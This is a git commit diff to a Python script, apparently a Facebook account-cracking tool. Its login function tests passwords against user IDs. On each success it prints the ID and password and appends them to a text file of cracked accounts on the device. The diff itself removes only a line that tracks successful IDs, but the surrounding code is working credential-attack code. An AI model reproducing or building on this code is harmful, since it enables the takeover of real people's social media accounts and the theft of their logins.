4dbefb4c6689fa5ad30616b424302f0c02df8bda
NEHAL VAU 😈 <167983114+nehaladrian21@users.noreply.github.com>
2026-04-25 15:43:39 +0600

    Update OLD.py

--- OLD.py
+++ OLD.py
@@ -475,7 +475,6 @@ def login_1(uid):
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mNEHAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/NEHAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mNEHAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
